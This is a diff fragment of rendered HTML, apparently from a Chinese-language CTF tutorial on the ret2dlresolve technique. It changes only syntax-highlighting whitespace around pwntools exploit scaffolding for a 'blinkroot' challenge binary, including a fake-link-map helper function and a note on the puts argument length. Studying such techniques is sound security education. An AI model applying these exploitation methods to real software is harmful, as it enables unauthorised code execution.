 <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./libc.so.6&quot;</span><span class=p>)</span>
 
-<span class=k>def</span> <span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>known_function_ptr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>known_function_ptr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
 <span class=w>    </span><span class=sd>&#39;&#39;&#39;</span>
 <span class=sd>    elf: is the ELF object</span>
 
@@ -2563,14 +2563,14 @@ iromise
 0x600BC8--&gt;data+8
 0x600BD0--&gt;data+16, args of puts
 0x600BE8--&gt;data+24
-</code></pre></div> <p>因此，我们可以控制的 puts 的参数的长度最大为 0x18。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</code></pre></div> <p>因此，我们可以控制的 puts 的参数的长度最大为 0x18。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span> <span class=s2>&quot;splitw&quot;</span><span class=p>,</span> <span class=s2>&quot;-h&quot;</span><span class=p>]</span>
 <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
 <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;blinkroot&quot;</span><span class=p>)</span>
 <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./libc.so.6&quot;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>libc</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>libc</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
 <span class=w>    </span><span class=sd>&#39;&#39;&#39;</span>
 <span class=sd>    libc: is the ELF object</span>
 
